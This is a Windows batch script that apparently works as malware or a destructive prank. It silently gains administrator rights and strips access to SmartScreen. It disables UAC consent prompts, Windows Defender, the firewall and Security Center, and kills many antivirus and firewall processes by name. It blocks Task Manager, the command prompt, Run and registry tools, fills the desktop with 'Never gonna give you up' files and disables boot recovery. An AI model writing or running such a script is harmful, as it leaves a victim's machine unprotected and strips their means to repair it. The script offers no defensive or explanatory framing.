@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges to continue...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

takeown /f "%systemroot%\System32\smartscreen.exe" /a
icacls "%systemroot%\System32\smartscreen.exe" /reset
taskkill /im smartscreen.exe /f
icacls "%systemroot%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
powershell.exe -command "netsh advfirewall set allprofiles state off"
net stop “Security Center”
netsh firewall set opmode mode=disable
netsh firewall set opmode mode=DISABLE
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set allprofiles state off
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
net stop "Windows Defender Service"
net stop "Windows Firewall"
cd %usernameprofile%\desktop
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
echo NEVER > NEVER.TXT
echo GONNA > GONNA.TXT
echo GIVE > GIVE.TXT
echo YOU > YOU.TXT
echo UP > UP.TXT
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled No
powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
powershell.exe -command "Set-MpPreference -PUAProtection disable"
powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"
powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"
powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
powershell.exe -command "netsh advfirewall set allprofiles state off"

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
